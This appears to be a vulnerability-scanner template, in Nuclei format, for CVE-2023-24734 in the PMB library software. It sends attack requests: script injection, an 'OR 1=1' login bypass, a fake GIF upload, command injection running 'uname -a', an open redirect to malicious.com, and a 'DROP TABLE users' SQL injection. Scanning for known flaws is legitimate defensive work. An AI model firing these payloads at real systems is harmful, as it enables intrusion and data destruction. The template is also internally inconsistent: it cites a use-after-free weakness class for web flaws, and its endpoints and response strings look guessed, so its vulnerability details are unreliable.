id: CVE-2023-24734

info:
  name: PMB v7.4.6 Multiple Vulnerabilities
  author: ProjectDiscoveryAI
  severity: critical
  description: Multiple vulnerabilities including XSS, SQL Injection, Unrestricted File Upload, and Remote Code Execution in PMB v7.4.6.
  impact: |
    Successful exploitation could lead to unauthorized access or data leakage.
  remediation: |
    Upgrade PMB to version 7.4.7 or later to address CVE-2023-24734.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-24734
    cwe-id: CWE-416
    epss-score: 0.00335
    epss-percentile: 0.72005
    cpe: cpe:2.3:a:sigb:pmb:7.4.6:*:*:*:*:*:*:*
  metadata:
    vendor: sigb
    product: pmb
    shodan-query: http.html:"PMB Group"
    fofa-query:
      - body="pmb group"
      - icon_hash=1469328760

http:
  - method: GET
    path:
      - "{{BaseURL}}/pmb/admin/convert/export_z3950.php?command=search&query=%3Cscript%3Ealert(document.domain);%3C/script%3E=or"

    matchers:
      - type: word
        words:
          - "<script>alert(document.domain);</script>"
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/pmb/edit.php?action=whatever&dest=TABLEAUCSV&user=%27%20OR%201=1;%23&password=password"

    matchers:
      - type: word
        words:
          - "admin"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/pmb/camera_upload.php"

    body: |
      upload_filename=evil.gif&imgBase64=GIF89a;
    matchers:
      - type: word
        words:
          - "File uploaded successfully"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/pmb/admin/sauvegarde/restaure_act.php"

    body: |
      filename=backup.zip&compress=no&decompress_type=zip&decompress=;uname -a;
    matchers:
      - type: word
        words:
          - "Linux"
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/pmb/opac_css/pmb.php?from=home&url=http://malicious.com&hash=12345"

    matchers:
      - type: word
        words:
          - "Redirecting to http://malicious.com"
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/pmb/opac_css/export.php?notice_id=1; DROP TABLE users;"

    matchers:
      - type: word
        words:
          - "SQL syntax error"
        part: body
